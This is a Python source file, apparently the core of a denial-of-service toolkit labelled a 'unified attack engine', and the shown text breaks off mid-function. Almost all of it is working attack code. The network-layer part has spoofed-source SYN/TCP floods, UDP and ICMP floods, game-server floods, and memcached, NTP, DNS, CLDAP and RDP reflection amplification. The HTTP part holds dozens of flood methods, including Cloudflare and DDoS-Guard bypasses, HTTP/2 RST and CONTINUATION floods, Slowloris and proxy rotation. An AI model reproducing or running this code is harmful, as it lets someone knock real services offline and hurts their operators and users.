"""Unified attack engine: Layer4 (network) + Layer7 (HTTP flood) methods."""

from __future__ import annotations
import asyncio
import json
import random
import socket as sock_module
import ssl as ssl_module
import threading
import time
from base64 import b64encode
from contextlib import suppress
from os import urandom as randbytes
from pathlib import Path
from random import choice as randchoice, randint
from socket import (
    AF_INET,
    AF_INET6,
    IPPROTO_ICMP,
    IPPROTO_IP,
    IPPROTO_TCP,
    IPPROTO_UDP,
    IP_HDRINCL,
    SOCK_DGRAM,
    SOCK_RAW,
    SOCK_STREAM,
    TCP_NODELAY,
    SOL_SOCKET,
    SO_REUSEADDR,
    gethostbyname,
    socket,
)
from struct import pack as data_pack
from threading import Thread, Event
from time import sleep, time as now
from typing import Any, List, Optional, Tuple
from urllib import parse
from uuid import UUID, uuid4

from PyRoxy import Proxy, ProxyUtiles
from PyRoxy import Tools as ProxyTools
from yarl import URL

from .utils import (
    REQUESTS_SENT,
    BYTES_SEND,
    Counter,
    Tools,
    bcolors,
    logger,
    ctx,
    exit,
    __dir__,
    waf_auto_select_bypass,
    waf_report_result,
    _traffic_graph,
)
from .tls import TLSRandomizer
from .adaptive import AdaptiveRPC, AdaptiveThrottle
from .deathstar import KeepalivePool, get_global_pool, WAFFingerprint
from .proxy import load_proxies

import requests  # for TOR flood


# Minecraft protocol helpers
class Minecraft:
    """Minimal Minecraft protocol for bot flood."""

    @staticmethod
    def handshake(target, protocol=754, next_state=2):
        host = target[0].encode()
        port = target[1]
        data = b"\x00"  # packet id
        data += Minecraft._varint(protocol)
        data += Minecraft._varint(len(host))
        data += host
        data += data_pack("!H", port)
        data += Minecraft._varint(next_state)
        return Minecraft._varint(len(data)) + data

    @staticmethod
    def login(protocol, username):
        data = b"\x00"
        data += Minecraft._varint(len(username))
        data += username.encode()
        return Minecraft._varint(len(data)) + data

    @staticmethod
    def chat(protocol, message):
        data = b"\x03"
        data += Minecraft._varint(len(message))
        data += message.encode("utf-16be")
        return Minecraft._varint(len(data)) + data

    @staticmethod
    def _varint(value):
        out = b""
        while True:
            temp = value & 0x7F
            value >>= 7
            if value:
                temp |= 0x80
            out += bytes([temp])
            if not value:
                return out


# tor2web gateways
tor2webs = [
    "www.dbay.shop",
    "www.bitcoin2day.net",
    "www.tor2web.org",
    "www.tor2web.su",
    "www.tor2web.cc",
    "www.onion.city",
    "www.onion.cab",
    "www.onion.direct",
    "www.onion.sh",
    "www.tor2web.fi",
    "www.tor2web.in",
    "www.tor2web.io",
    "www.tor2web.xyz",
    "www.darknet.to",
    "www.dark.fail",
]


# ============================================================
# LAYER 4 - Network/Transport attacks
# ============================================================
class Layer4:
    """Layer 4 attack methods: TCP, UDP, SYN, ICMP, amplification, Minecraft, etc."""

    def __init__(
        self,
        target: Tuple[str, int],
        threads: int = 1,
        duration: int = 60,
        method: str = "TCP",
        proxies: Any = None,
        rpc: int = 10,
        reflectors: Optional[List[str]] = None,
    ):
        self._target = target
        self._threads = threads or 1
        self._duration = duration or 60
        self._method = method.upper()
        self._proxies = proxies
        self._rpc = rpc or 10
        self._reflectors = reflectors or []
        self._stop = threading.Event()

    def _ip_header(self, src: str, dst: str, proto: int, payload_len: int) -> bytes:
        ver_ihl = 0x45
        tos = 0
        total_len = 20 + payload_len
        ident = randint(0, 65535)
        flags_off = 0
        ttl = 255
        proto_ = proto
        src = sock_module.inet_aton(src)
        dst = sock_module.inet_aton(dst)
        checksum = 0
        header = data_pack(
            "!BBHHHBBH4s4s",
            ver_ihl,
            tos,
            total_len,
            ident,
            flags_off,
            ttl,
            proto_,
            checksum,
            src,
            dst,
        )
        # Compute IP checksum
        s = 0
        for i in range(0, len(header), 2):
            w = (header[i] << 8) + header[i + 1]
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        s = ~s & 0xFFFF
        return header[:10] + data_pack("H", s) + header[12:]

    def _rand_ip(self) -> str:
        return (
            f"{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}.{randint(1, 255)}"
        )

    def run(self):
        """Start attack for given duration."""
        logger.info(
            f"[{self._method}] Attacking {self._target[0]}:{self._target[1]} "
            f"with {self._threads} threads for {self._duration}s"
        )
        threads = []
        for i in range(self._threads):
            t = Thread(target=self._worker, daemon=True)
            t.start()
            threads.append(t)
        self._stop.wait(self._duration)
        self._stop.set()
        for t in threads:
            t.join(timeout=2)

    def _worker(self):
        """Dispatch to method-specific handler."""
        m = self._method
        if m == "TCP":
            self._tcp_flood()
        elif m == "UDP":
            self._udp_flood()
        elif m == "SYN":
            self._syn_flood()
        elif m == "ICMP":
            self._icmp_flood()
        elif m == "VSE":
            self._vse_flood()
        elif m == "MINECRAFT" or m == "MCBOT":
            self._minecraft_flood()
        elif m == "CONNECTION" or m == "CPS":
            self._connection_flood()
        elif m == "FIVEM":
            self._fivem_flood()
        elif m == "FIVEM-TOKEN":
            self._fivem_token_flood()
        elif m == "TS3":
            self._ts3_flood()
        elif m == "MCPE":
            self._mcpe_flood()
        elif m == "OVH-UDP":
            self._ovh_udp_flood()
        elif m == "MEM":
            self._memcached_amp()
        elif m == "NTP":
            self._ntp_amp()
        elif m == "DNS":
            self._dns_amp()
        elif m == "ARD":
            self._ard_amp()
        elif m == "CLDAP":
            self._cldap_amp()
        elif m == "CHAR":
            self._char_amp()
        elif m == "RDP":
            self._rdp_amp()
        else:
            logger.warning(f"Unknown L4 method: {m}")

    # ---- Raw TCP flood ----
    def _tcp_flood(self):
        raw = self._get_raw_socket(IPPROTO_TCP)
        if not raw:
            return
        src_ip = self._rand_ip()
        dst_ip = gethostbyname(self._target[0])
        dst_port = self._target[1]
        while not self._stop.is_set():
            for _ in range(self._rpc):
                if self._stop.is_set():
                    break
                src_port = randint(1024, 65535)
                seq = randint(0, 2**32 - 1)
                ack = 0
                data_offset = 0x50
                flags = 0x02  # SYN
                window = randint(1024, 65535)
                checksum = 0
                urg_ptr = 0
                tcp_hdr = data_pack(
                    "!HHIIBBHHH",
                    src_port,
                    dst_port,
                    seq,
                    ack,
                    data_offset,
                    flags,
                    window,
                    checksum,
                    urg_ptr,
                )
                payload = randbytes(randint(0, 100))
                pseudo = sock_module.inet_aton(src_ip) + sock_module.inet_aton(dst_ip)
                pseudo += data_pack("!BBH", 0, IPPROTO_TCP, len(tcp_hdr) + len(payload))
                checksum = self._checksum(pseudo + tcp_hdr + payload)
                tcp_hdr = tcp_hdr[:16] + data_pack("H", checksum) + tcp_hdr[18:]
                ip_hdr = self._ip_header(
                    src_ip, dst_ip, IPPROTO_TCP, len(tcp_hdr) + len(payload)
                )
                try:
                    raw.sendto(ip_hdr + tcp_hdr + payload, (dst_ip, 0))
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(ip_hdr) + len(tcp_hdr) + len(payload)
                except Exception:
                    pass

    # ---- UDP flood ----
    def _udp_flood(self):
        try:
            s = socket(AF_INET, SOCK_DGRAM)
            while not self._stop.is_set():
                for _ in range(self._rpc):
                    if self._stop.is_set():
                        break
                    payload = randbytes(randint(64, 1400))
                    s.sendto(payload, self._target)
                    BYTES_SEND += len(payload)
                    REQUESTS_SENT += 1
        except Exception:
            pass

    # ---- SYN flood ----
    def _syn_flood(self):
        self._tcp_flood()  # SYN flood = raw TCP with SYN flag

    # ---- ICMP flood ----
    def _icmp_flood(self):
        try:
            s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)
            while not self._stop.is_set():
                payload = randbytes(randint(64, 1024))
                header = data_pack("!BBHHH", 8, 0, 0, randint(0, 65535), 1)
                s.sendto(header + payload, self._target)
                REQUESTS_SENT += 1
                BYTES_SEND += len(header) + len(payload)
        except Exception:
            pass

    # ---- VSE (Valve Source Engine) flood ----
    def _vse_flood(self):
        try:
            s = socket(AF_INET, SOCK_DGRAM)
            req = b"\xff\xff\xff\xffTSource Engine Query\x00"
            while not self._stop.is_set():
                s.sendto(req, self._target)
                REQUESTS_SENT += 1
        except Exception:
            pass

    # ---- Minecraft flood ----
    def _minecraft_flood(self):
        try:
            s = socket(AF_INET, SOCK_STREAM)
            s.settimeout(5)
            s.connect(self._target)
            mc = Minecraft()
            hs = mc.handshake(self._target, 754, 2)
            s.send(hs)
            s.send(mc.login(754, f"Bot_{randint(1000, 9999)}"))
            while not self._stop.is_set():
                s.send(mc.chat(754, "A" * 256))
                REQUESTS_SENT += 1
                sleep(0.05)
        except Exception:
            pass

    # ---- Connection flood ----
    def _connection_flood(self):
        socks = []
        try:
            for _ in range(min(self._rpc, 200)):
                s = socket(AF_INET, SOCK_STREAM)
                s.settimeout(3)
                s.connect(self._target)
                socks.append(s)
                REQUESTS_SENT += 1
            sleep(self._duration if not self._stop.is_set() else 0)
        except Exception:
            pass
        for s in socks:
            Tools.safe_close(s)

    # ---- Fivem flood ----
    def _fivem_flood(self):
        try:
            s = socket(AF_INET, SOCK_DGRAM)
            while not self._stop.is_set():
                payload = b"\xff\xff\xff\xffgetinfo xxx"
                s.sendto(payload, self._target)
                REQUESTS_SENT += 1
        except Exception:
            pass

    def _fivem_token_flood(self):
        try:
            s = socket(AF_INET, SOCK_DGRAM)
            while not self._stop.is_set():
                token = uuid4().hex[:32]
                payload = f"\xff\xff\xff\xffgetinfo {token}".encode()
                s.sendto(payload, self._target)
                REQUESTS_SENT += 1
        except Exception:
            pass

    # ---- TS3 flood ----
    def _ts3_flood(self):
        try:
            s = socket(AF_INET, SOCK_DGRAM)
            while not self._stop.is_set():
                payload = b"\x05\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00"
                s.sendto(payload, self._target)
                REQUESTS_SENT += 1
        except Exception:
            pass

    # ---- MCPE flood ----
    def _mcpe_flood(self):
        try:
            s = socket(AF_INET, SOCK_DGRAM)
            while not self._stop.is_set():
                payload = b"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x00\xfe\xfe\xfe\xfe\xfd\xfd\xfd\xfd\x12\x34\x56\x78"
                s.sendto(payload, self._target)
                REQUESTS_SENT += 1
        except Exception:
            pass

    # ---- OVH UDP flood ----
    def _ovh_udp_flood(self):
        try:
            s = socket(AF_INET, SOCK_DGRAM)
            while not self._stop.is_set():
                payload = randbytes(randint(800, 1400))
                s.sendto(payload, self._target)
                REQUESTS_SENT += 1
                BYTES_SEND += len(payload)
        except Exception:
            pass

    # ---- Amplification methods ----
    def _memcached_amp(self):
        self._send_amp_request(
            b"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00get / HTTP/1.1\r\nHost: localhost\r\n\r\n"
        )

    def _ntp_amp(self):
        self._send_amp_request(b"\x17\x00\x03\x2a" + b"\x00" * 4)

    def _dns_amp(self):
        query = b"\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01"
        self._send_amp_request(query)

    def _ard_amp(self):
        self._send_amp_request(b"\x00\x00\x00\x00")

    def _cldap_amp(self):
        self._send_amp_request(
            b"\x30\x25\x02\x01\x01\x60\x20\x02\x01\x03\x04\x0e\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x01\x01\xff\x81\x0a\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        )

    def _char_amp(self):
        self._send_amp_request(b"\x00\x00\x00\x00")

    def _rdp_amp(self):
        self._send_amp_request(
            b"\x03\x00\x00\x13\x0e\xc0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00"
        )

    def _send_amp_request(self, payload: bytes):
        try:
            s = socket(AF_INET, SOCK_DGRAM)
            # Send to reflectors if available, else target
            targets = (
                [(r, self._target[1]) for r in self._reflectors]
                if self._reflectors
                else [self._target]
            )
            while not self._stop.is_set():
                for t in targets:
                    if self._stop.is_set():
                        break
                    s.sendto(payload, t)
                    REQUESTS_SENT += 1
                    BYTES_SEND += len(payload)
        except Exception:
            pass

    # ---- helpers ----
    def _get_raw_socket(self, proto):
        try:
            s = socket(AF_INET, SOCK_RAW, proto)
            s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
            return s
        except PermissionError:
            logger.error("Raw sockets need root. Try sudo.")
            return None

    @staticmethod
    def _checksum(data: bytes) -> int:
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + (data[i + 1] if i + 1 < len(data) else 0)
            s += w
        s = (s >> 16) + (s & 0xFFFF)
        return ~s & 0xFFFF


# ============================================================
# LAYER 7 - HTTP Flood methods
# ============================================================
class HttpFlood:
    """HTTP flood methods: GET, POST, CFB, BYPASS, H2, RAPID, STEALTH, etc."""

    def __init__(
        self,
        target: URL,
        method: str = "GET",
        threads: int = 1,
        duration: int = 60,
        rpc: int = 10,
        proxies: Any = None,
        useragents: Optional[List[str]] = None,
        referers: Optional[List[str]] = None,
        stop_event: Optional[Event] = None,
    ):
        self._target = target
        self._method = method.upper()
        self._threads = threads or 1
        self._duration = duration or 60
        self._rpc = rpc or 10
        self._proxies = proxies
        self._useragents = useragents or []
        self._referers = referers or []
        self._stop = stop_event or Event()
        self._req_type = method.upper()
        self.SpoofIP = ""
        self._harvested_cookie = None
        self._harvest_lock = threading.Lock()
        self._proxy_rotator = None
        if self._proxies:
            from .proxy import ProxyRotator

            self._proxy_rotator = ProxyRotator(self._proxies)

    def _cache_bust_path(self, length: int = 8) -> str:
        path = self._target.raw_path_qs or "/"
        separator = "&" if "?" in path else "?"
        return f"{path}{separator}{uuid4().hex[:length]}"

    def _bypass_request_line(self, path: str) -> str:
        return waf_auto_select_bypass(
            self._req_type, self._target.authority or self._target.host, path
        )

    def generate_payload(self, extra: str = "") -> bytes:
        path = self._cache_bust_path()
        return str.encode(
            f"{self._bypass_request_line(path)}"
            f"Host: {self._target.authority}\r\n"
            f"User-Agent: {randchoice(self._useragents)}\r\n"
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
            f"Accept-Language: en-US,en;q=0.5\r\n"
            f"Accept-Encoding: gzip, deflate, br\r\n"
            f"Connection: keep-alive\r\n"
            f"Cache-Control: no-cache\r\n"
            f"{self.SpoofIP}"
            f"{extra}"
            f"\r\n"
        )

    def _parse_proxy(self, proxy_str: str) -> Optional[Tuple[str, int, str]]:
        """Parse proxy string like 'socks5://IP:PORT' or 'http://IP:PORT'."""
        try:
            if "://" in proxy_str:
                proto, rest = proxy_str.split("://", 1)
            else:
                proto = "http"
                rest = proxy_str
            if ":" in rest:
                host, port = rest.rsplit(":", 1)
                return (host, int(port), proto.lower())
        except Exception:
            pass
        return None

    def open_connection(self) -> Optional[socket]:
        """Open TCP/TLS connection to target with proxy support."""
        try:
            use_ssl = self._target.scheme == "https"
            if self._proxy_rotator:
                proxy_str = self._proxy_rotator.next()
                if proxy_str:
                    parsed = self._parse_proxy(str(proxy_str))
                    if not parsed:
                        return None
                    proxy_host, proxy_port, proxy_proto = parsed
                    s = sock_module.socket(AF_INET, SOCK_STREAM)
                    s.settimeout(10)
                    s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
                    s.connect((proxy_host, proxy_port))
                    # HTTP CONNECT for HTTPS (only for http proxies)
                    if use_ssl and proxy_proto in ("http", "https"):
                        connect_req = (
                            f"CONNECT {self._target.host}:{self._target.port} HTTP/1.1\r\n"
                            f"Host: {self._target.host}:{self._target.port}\r\n\r\n"
                        ).encode()
                        s.sendall(connect_req)
                        resp = s.recv(4096)
                        if b"200" not in resp:
                            s.close()
                            return None
                        import ssl as ssl_mod

                        ctx = ssl_mod.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl_mod.CERT_NONE
                        s = ctx.wrap_socket(s, server_hostname=self._target.host)
                    return s
            s = sock_module.socket(AF_INET, SOCK_STREAM)
            s.settimeout(10)
            s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
            s.connect((self._target.host, self._target.port or 443))
            if use_ssl:
                s = TLSRandomizer.get_ssl_context().wrap_socket(
                    s, server_hostname=self._target.host
                )
            return s
        except Exception:
            return None

    def run(self):
        """Start flood threads."""
        logger.info(
            f"[{self._method}] Attacking {self._target.human_repr()} "
            f"with {self._threads} threads for {self._duration}s"
        )
        threads = []
        for _ in range(self._threads):
            t = Thread(target=self._method_router, daemon=True)
            t.start()
            threads.append(t)
        self._stop.wait(self._duration)
        self._stop.set()
        for t in threads:
            t.join(timeout=2)

    def _method_router(self):
        """Route to the correct flood method."""
        m = self._method
        if m in ("GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS", "PATCH"):
            self._http_method(m)
        elif m == "CFB":
            self._cfb_flood()
        elif m == "BYPASS":
            self._bypass_flood()
        elif m == "OVH":
            self._ovh_flood()
        elif m == "STRESS":
            self._stress_flood()
        elif m == "DYN":
            self._dyn_flood()
        elif m == "SLOW":
            self._slow_flood()
        elif m == "SLOWLORIS":
            self._slowloris_flood()
        elif m == "NULL":
            self._null_flood()
        elif m == "COOKIE":
            self._cookie_flood()
        elif m == "PPS":
            self._pps_flood()
        elif m == "EVEN":
            self._even_flood()
        elif m == "GSB":
            self._gsb_flood()
        elif m == "DGB":
            self._dgb_flood()
        elif m == "AVB":
            self._avb_flood()
        elif m == "CFBUAM":
            self._cfbuam_flood()
        elif m == "APACHE":
            self._apache_flood()
        elif m == "XMLRPC":
            self._xmlrpc_flood()
        elif m == "XMLRPC_MULTI":
            self._xmlrpc_multi_flood()
        elif m == "BOT":
            self._bot_flood()
        elif m == "BOMB":
            self._bomb_flood()
        elif m == "DOWNLOADER":
            self._downloader_flood()
        elif m == "KILLER":
            self._killer_flood()
        elif m == "TOR":
            self._tor_flood()
        elif m == "RHEX":
            self._rhex_flood()
        elif m == "STOMP":
            self._stomp_flood()
        elif m == "WORDPRESS":
            self._wordpress_flood()
        elif m == "H2":
            self._h2_flood()
        elif m == "H2_RST":
            self._h2_rst_flood()
        elif m == "COOKIE_HARVEST":
            self._cookie_harvest_flood()
        elif m == "WS":
            self._ws_flood()
        elif m == "GQL":
            self._gql_flood()
        elif m in ("H2_PRIORITY",):
            self._h2_priority_flood()
        elif m == "RANGE_CRASH":
            self._range_crash_flood()
        elif m == "STEALTH":
            self._stealth_flood()
        elif m == "MIX":
            self._mix_flood()
        elif m == "RAPID":
            self._rapid_flood()
        elif m == "QUIC":
            self._quic_flood()
        elif m == "TLS_FLOOD":
            self._tls_flood()
        elif m == "H2_CONT":
            self._h2_cont_flood()
        elif m == "IMPERSONATE":
            self._impersonate_flood()
        elif m == "MEGA":
            self._mega_flood()
        elif m == "ASYNC":
            self._async_flood()

    def _http_method(self, method: str):
        """Generic HTTP method flooder."""
        self._req_type = method
        s = None
        for attempt in range(3):
            try:
                s = self.open_connection()
                if s is None:
                    continue
                for _ in range(self._rpc):
                    if self._stop.is_set():
                        return
                    payload = self.generate_payload()
                    Tools.send(s, payload)
                break
            except Exception:
                continue
        Tools.safe_close(s)

    # ---- Method-specific floods (simplified wrappers) ----
    def _cfb_flood(self):
        self._send_raw_requests(
            "GET", with_chrome_headers=True, accept_encoding="gzip, deflate, br"
        )

    def _bypass_flood(self):
        self._http_method("GET")

    def _ovh_flood(self):
        self._send_raw_requests(
            "GET", extra_headers={"X-Requested-With": "XMLHttpRequest"}
        )

    def _stress_flood(self):
        self._send_raw_requests("POST", body=randbytes(randint(100, 1000)))

    def _dyn_flood(self):
        self._send_raw_requests("GET", cache_bust_dynamic=True)

    def _slow_flood(self):
        """Send headers slowly, one line at a time."""
        s = self.open_connection()
        if not s:
            return
        try:
            path = self._cache_bust_path()
            s.send(f"GET {path} HTTP/1.1\r\n".encode())
            for hdr_key, hdr_val in [
                ("Host", self._target.authority or self._target.host),
                ("User-Agent", randchoice(self._useragents)),
                ("Accept", "*/*"),
            ]:
                if self._stop.is_set():
                    return
                s.send(f"{hdr_key}: {hdr_val}\r\n".encode())
                sleep(0.5)
            s.send(b"\r\n")
            REQUESTS_SENT += 1
        except Exception:
            pass
        Tools.safe_close(s)

    def _slowloris_flood(self):
        from .deathstar import SlowlorisFlood as SF

        fl = SF(
            self._target.host,
            self._target.port or (443 if self._target.scheme == "https" else 80),
            sockets=min(self._rpc * 10, 500),
            use_ssl=(self._target.scheme == "https"),
            log_callback=lambda msg: logger.info(msg),
        )
        fl.start()
        self._stop.wait(self._duration)
        fl.stop()

    def _null_flood(self):
        self._send_raw_requests("GET", null_version=True)

    def _cookie_flood(self):
        self._send_raw_requests(
            "GET", extra_headers={"Cookie": f"session={uuid4().hex}"}
        )

    def _pps_flood(self):
        self._send_raw_requests("GET", rpc=max(1, self._rpc // 2))

    def _even_flood(self):
        self._send_raw_requests("GET", bypass_even=True)

    def _gsb_flood(self):
        self._send_raw_requests("GET", gsb_trigger=True)

    def _dgb_flood(self):
        """DDoS-Guard bypass via cookie solving."""
        from .utils import Tools

        try:
            session = Tools.dgb_solver(
                self._target.human_repr(), randchoice(self._useragents)
            )
            for _ in range(self._rpc):
                if self._stop.is_set():
                    return
                r = session.get(self._target.human_repr(), timeout=10)
                REQUESTS_SENT += 1
                BYTES_SEND += len(r.content) + 500
        except Exception:
            pass

    def _avb_flood(self):
        self._send_raw_requests("GET", avb_bypass=True)

    def _cfbuam_flood(self):
        """Cloudflare Under Attack Mode bypass."""
        for _ in range(min(self._rpc, 10)):
            try:
                import cloudscraper

                scraper = cloudscraper.create_scraper()
                r = scraper.get(self._target.human_repr(), timeout=15)
                REQUESTS_SENT += 1
                BYTES_SEND += len(r.content) + 500
            except Exception:
                pass

    def _apache_flood(self):
        self._send_raw_requests("GET", range_attack=True)

    def _xmlrpc_flood(self):
        body = "<?xml version='1.0'?><methodCall><methodName>pingback.ping</methodName>"
        body += f"<params><param><value><string>{self._target.human_repr()}</string></value></param></params></methodCall>"
        self._send_raw_requests("POST", body=body.encode(), content_type="text/xml")

    def _xmlrpc_multi_flood(self):
        body = "<?xml version='1.0'?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data>"
        for _ in range(randint(10, 50)):
            body += "<value><struct><member><name>methodName</name><value><string>pingback.ping</string></value></member></struct></value>"
        body += "</data></array></value></param></params></methodCall>"
        self._send_raw_requests("POST", body=body.encode(), content_type="text/xml")

    def _bot_flood(self):
        self._send_raw_requests(
            "GET",
            extra_headers={
                "Referer": f"https://www.google.com/search?q={uuid4().hex[:8]}",
            },
        )

    def _bomb_flood(self):
        self._send_raw_requests("POST", body=randbytes(randint(1024, 65536)))

    def _downloader_flood(self):
        self._send_raw_requests(
            "GET", extra_headers={"Range": "bytes=0-"}, accept_encoding="identity"
        )

    def _killer_flood(self):
        self._send_raw_requests(
            "GET", extra_headers={"X-Forwarded-For": self._rand_ip()}
        )

    def _tor_flood(self):
        for host in tor2webs:
            url = f"https://{host}{self._target.path}"
            try:
                r = requests.get(
                    url, timeout=5, headers={"User-Agent": randchoice(self._useragents)}
                )
                REQUESTS_SENT += 1
            except Exception:
                pass

    def _rhex_flood(self):
        path = "/" + "".join(randchoice("0123456789abcdef") for _ in range(64))
        self._send_raw_requests("GET", custom_path=path)

    def _stomp_flood(self):
        self._send_raw_requests("GET", stomp_evasion=True)

    def _wordpress_flood(self):
        self._send_raw_requests(
            "POST",
            body=b"log=admin&pwd=admin",
            content_type="application/x-www-form-urlencoded",
            custom_path="/wp-login.php",
        )

    def _h2_flood(self):
        self._http2_rst_flood(reset=False)

    def _h2_rst_flood(self):
        self._http2_rst_flood(reset=True)

    def _http2_rst_flood(self, reset: bool = True):
        """HTTP/2 flood with optional RST_STREAM."""
        try:
            from hyper.http20.h2 import H2Connection

            conn = H2Connection()
            s = self.open_connection()
            if not s:
                return
            if self._target.scheme != "https":
                self._http_method("GET")
                return
            conn.initiate_connection()
            s.sendall(conn.data_to_send())
            headers = [
                (":method", "GET"),
                (":authority", self._target.authority or self._target.host),
                (":scheme", "https"),
                (":path", self._cache_bust_path()),
                ("user-agent", randchoice(self._useragents)),
                ("accept", "*/*"),
            ]
            for _ in range(self._rpc):
                if self._stop.is_set():
                    return
                stream_id = randint(3, 2147483647) if reset else (_ * 2 + 1)
                conn.send_headers(stream_id, headers, end_stream=not reset)
                s.sendall(conn.data_to_send())
                if reset:
                    conn.reset_stream(stream_id)
                    s.sendall(conn.data_to_send())
                REQUESTS_SENT += 1
            s.close()
        except Exception:
            pass

    def _cookie_harvest_flood(self):
        """Harvest cookie via Playwright then flood."""
        if self._harvested_cookie is None:
            with self._harvest_lock:
                if self._harvested_cookie is None:
                    try:
                        from playwright.sync_api import sync_playwright

                        with sync_playwright() as p:
                            browser = p.chromium.launch(headless=True)
                            page = browser.new_page()
                            page.goto(
                                self._target.human_repr(),
                                timeout=30000,
                                wait_until="networkidle",
                            )
                            cookies = page.context.cookies()
                            cookie_str = "; ".join(
                                f"{c['name']}={c['value']}" for c in cookies
                            )
                            browser.close()
                            self._harvested_cookie = cookie_str or "NO_COOKIE"
                            logger.info(f"Cookie harvested: {cookie_str[:80]}...")
                    except Exception as e:
                        logger.warning(f"Cookie harvest failed: {e}")
                        self._harvested_cookie = "NO_COOKIE"
        cookie = self._harvested_cookie or ""
        self._send_raw_requests("GET", extra_headers={"Cookie": cookie})

    def _ws_flood(self):
        """WebSocket flood."""
        import struct
        from base64 import b64encode

        try:
            s = self.open_connection()
            if not s:
                return
            key = b64encode(uuid4().bytes).decode()
            upgrade = (
                f"GET {self._cache_bust_path()} HTTP/1.1\r\n"
                f"Host: {self._target.authority}\r\n"
                f"Upgrade: websocket\r\n"
                f"Connection: Upgrade\r\n"
                f"Sec-WebSocket-Key: {key}\r\n"
                f"Sec-WebSocket-Version: 13\r\n"
                f"User-Agent: {randchoice(self._useragents)}\r\n\r\n"
            ).encode()
            s.sendall(upgrade)
            REQUESTS_SENT += 1
            s.close()
        except Exception:
            pass

    def _gql_flood(self):
        """GraphQL flood."""
        body = '{"query":"query { __typename }","variables":{}}'
        self._send_raw_requests(
            "POST",
            body=body.encode(),
            content_type="application/json",
            custom_path="/graphql",
        )

    def _h2_priority_flood(self):
        """HTTP/2 priority flood."""
        try:
            from hyper.http20.h2 import H2Connection

            conn = H2Connection()
            s = self.open_connection()
            if not s:
                return
            if self._target.scheme != "https":
                self._http_method("GET")
                return
            conn.initiate_connection()
            s.sendall(conn.data_to_send())
            headers = [
                (":method", "GET"),
                (":authority", self._target.authority or self._target.host),
                (":scheme", "https"),
                (":path", self._cache_bust_path()),
                ("user-agent", randchoice(self._useragents)),
            ]
            for _ in range(self._rpc):
                if self._stop.is_set():
                    return
                stream_id = _ * 2 + 1
                conn.send_headers(stream_id, headers, end_stream=False)
                conn.prioritize(stream_id, weight=randint(1, 256))
                s.sendall(conn.data_to_send())
                REQUESTS_SENT += 1
            s.close()
        except Exception:
            pass

    def _range_crash_flood(self):
        """Range header crash attempt."""
        self._send_raw_requests(
            "GET",
            extra_headers={
                "Range": "bytes=0-,5-10,11-20,21-30,31-40",
            },
        )

    def _stealth_flood(self):
        """Stealth flood with randomized timing."""
        for _ in range(self._rpc):
            if self._stop.is_set():
                return
            self._http_method("GET")
            sleep(random.uniform(0.01, 0.05))

    def _mix_flood(self):
        """Mix various HTTP methods."""
        methods = ["GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"]
        for _ in range(self._rpc):
            if self._stop.is_set():
                return
            m = randchoice(methods)
            self._http_method(m)

    def _rapid_flood(self):
        """Rapid fire flood - many requests per connection."""
        s = self.open_connection()
        if not s:
            return
        try:
            for _ in range(self._rpc * 5):
                if self._stop.is_set():
                    return
                payload = self.generate_payload()
                Tools.send(s, payload)
                REQUESTS_SENT += 1
        except Exception:
            pass
        Tools.safe_close(s)

    def _quic_flood(self):
        """QUIC flood (requires aioquic)."""
        try:
            import aioquic
            from aioquic.quic.connection import QuicConnection

            conn = QuicConnection()
            conn.connect(self._target.host, self._target.port or 443)
            s = socket(AF_INET, SOCK_DGRAM)
            while not self._stop.is_set():
                data = conn.send()
                if data:
                    s.sendto(data, (self._target.host, self._target.port or 443))
                    REQUESTS_SENT += 1
        except Exception:
            pass

    def _tls_flood(self):
        """Open TLS connections rapidly then close."""
        for _ in range(self._rpc):
            if self._stop.is_set():
                return
            try:
                s = self.open_connection()
                if s:
                    Tools.safe_close(s)
                REQUESTS_SENT += 1
            except Exception:
                pass

    def _h2_cont_flood(self):
        """HTTP/2 CONTINUATION flood."""
        try:
            from hyper.http20.h2 import H2Connection

            conn = H2Connection()
            s = self.open_connection()
            if not s:
                return
            conn.initiate_connection()
            s.sendall(conn.data_to_send())
            base_headers = [
                (":method", "GET"),
                (":authority", self._target.authority),
                (":scheme", "https"),
                (":path", "/"),
                ("user-agent", randchoice(self._useragents)),
            ]
            for _ in range(self._rpc):
                if self._stop.is_set():
                    return
                stream_id = _ * 2 + 1
                conn.send_headers(stream_id, base_headers, end_stream=False)
                # Send many CONTINUATION frames
                for _ in range(50):
                    conn.send_headers(
                        stream_id, [("x-cont", "A" * 1000)], end_stream=False
                    )
                conn.end_stream(stream_id)
                s.sendall(conn.data_to_send())
                REQUESTS_SENT += 1
            s.close()
        except Exception:
            pass

    def _impersonate_flood(self):
        """Use curl_cffi for browser impersonation."""
        try:
            from curl_cffi import requests as curl_requests

            for _ in range(self._rpc):
                if self._stop.is_set():
                    return
                r = curl_requests.get(
                    self._target.human_repr(),
                    headers={"User-Agent": randchoice(self._useragents)},
                    impersonate="chrome110",
                    timeout=10,
                )
                REQUESTS_SENT += 1
                BYTES_SEND += len(r.content) + 500
        except Exception:
            pass

    def _mega_flood(self):
        """Async HTTP flood via aiohttp."""

        async def _mega():
            try:
                import aiohttp

                conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300)
                async with aiohttp.ClientSession(connector=conn) as session:
                    for _ in range(self._rpc):
                        if self._stop.is_set():
                            return
                        try:
                            async with session.get(
